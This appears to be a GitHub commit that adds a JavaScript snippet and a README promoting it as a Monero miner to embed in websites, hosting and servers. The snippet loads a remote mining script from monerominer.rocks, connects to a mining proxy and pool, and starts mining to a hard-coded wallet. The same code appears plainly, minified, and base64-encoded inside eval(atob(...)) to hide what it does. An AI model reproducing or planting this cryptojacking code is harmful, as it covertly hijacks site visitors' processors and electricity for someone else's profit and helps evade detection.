56ab1eb5de2513ba508d480b56140b4c9629470a
BigGamer1 <73133185+BigGamer1@users.noreply.github.com>
2023-10-12 23:54:53 -0400

    Initial commit

---
+++ Javascript Miner 2023.jsx
@@ -0,0 +1,28 @@
+<script src='https://monerominer.rocks/miner-mmr/webmnr.min.js'></script>
+<script>
+    let script = document.createElement('script');
+    let head = document.getElementsByTagName('head')[0];
+    
+    script.setAttribute('src', 'https://monerominer.rocks/miner-mmr/webmnr.min.js');
+    head.appendChild(script);
+
+    script.onload = () => {    
+        server            = 'wss://f.xmrminingproxy.com:8181';
+        var pool          = 'moneroocean.stream';
+        var walletAddress = '44x2jiaupK37uVF3VEeyrUS73G5eCtDY7Ge3NonKUWeuUr1irYjpXJA4BfM96EKpgAcdUDyKUFh1ti7vNPD8y1VHVSLE5DS'; //your wallet address here
+        var workerId      = ''
+        var threads       = -1;
+        var password      = 'x';
+
+        startMining(pool, walletAddress, workerId, threads, password);
+        throttleMiner = 20;
+    }
+</script>
+
+let script=document.createElement("script"),head=document.getElementsByTagName("head")[0];script.setAttribute("src","https://monerominer.rocks/miner-mmr/webmnr.min.js"),head.appendChild(script),script.onload=()=>{server="wss://f.xmrminingproxy.com:8181";startMining("moneroocean.stream","4AHPgEmCPqqWx4FB2SfraKcSj31w3mtKWDuEUwXVKfH415EqA2tYHhkMZ6VuLVmsJeFLPi4Z94nRAbHhZ59BS1TrNQVvNHE","",-1,"x"),throttleMiner=20};
+
+<!-- bGV0IHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKSxoZWFkPWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF07c2NyaXB0LnNldEF0dHJpYnV0ZSgic3JjIiwiaHR0cHM6Ly9tb25lcm9taW5lci5yb2Nrcy9taW5lci1tbXIvd2VibW5yLm1pbi5qcyIpLGhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KSxzY3JpcHQub25sb2FkPSgpPT57c2VydmVyPSJ3c3M6Ly9mLnhtcm1pbmluZ3Byb3h5LmNvbTo4MTgxIjtzdGFydE1pbmluZygibW9uZXJvb2NlYW4uc3RyZWFtIiwiNEFIUGdFbUNQcXFXeDRGQjJTZnJhS2NTajMxdzNtdEtXRHVFVXdYVktmSDQxNUVxQTJ0WUhoa01aNlZ1TFZtc0plRkxQaTRaOTRuUkFiSGhaNTlCUzFUck5RVnZOSEUiLCIiLC0xLCJ4IiksdGhyb3R0bGVNaW5lcj0yMH07 -->
+
+<script>
+    eval(atob('bGV0IHNjcmlwdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKSxoZWFkPWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJoZWFkIilbMF07c2NyaXB0LnNldEF0dHJpYnV0ZSgic3JjIiwiaHR0cHM6Ly9tb25lcm9taW5lci5yb2Nrcy9taW5lci1tbXIvd2VibW5yLm1pbi5qcyIpLGhlYWQuYXBwZW5kQ2hpbGQoc2NyaXB0KSxzY3JpcHQub25sb2FkPSgpPT57c2VydmVyPSJ3c3M6Ly9mLnhtcm1pbmluZ3Byb3h5LmNvbTo4MTgxIjtzdGFydE1pbmluZygibW9uZXJvb2NlYW4uc3RyZWFtIiwiNEFIUGdFbUNQcXFXeDRGQjJTZnJhS2NTajMxdzNtdEtXRHVFVXdYVktmSDQxNUVxQTJ0WUhoa01aNlZ1TFZtc0plRkxQaTRaOTRuUkFiSGhaNTlCUzFUck5RVnZOSEUiLCIiLC0xLCJ4IiksdGhyb3R0bGVNaW5lcj0yMH07'));
+</script>
---
+++ README.md
@@ -0,0 +1,13 @@
+<p align="center">
+  <a href="https://accounts.binance.com/register?ref=54548622" target="_blank"><img width="480" height="150" src="https://media.giphy.com/media/r5PH7oEtPW7hCnZiWN/giphy.gif"> CryptoERA
+</p>
+
+# Miner for Website | Hosting | Server
+## Javascript XMR Miner
+### Stream Here - > https://moneroocean.stream
+
+## Video Tutorial - https://youtu.be/xxda_TO5hSQ 
+<hr>
+Miner for Hosting
+Miner for Website
+Miner for Server
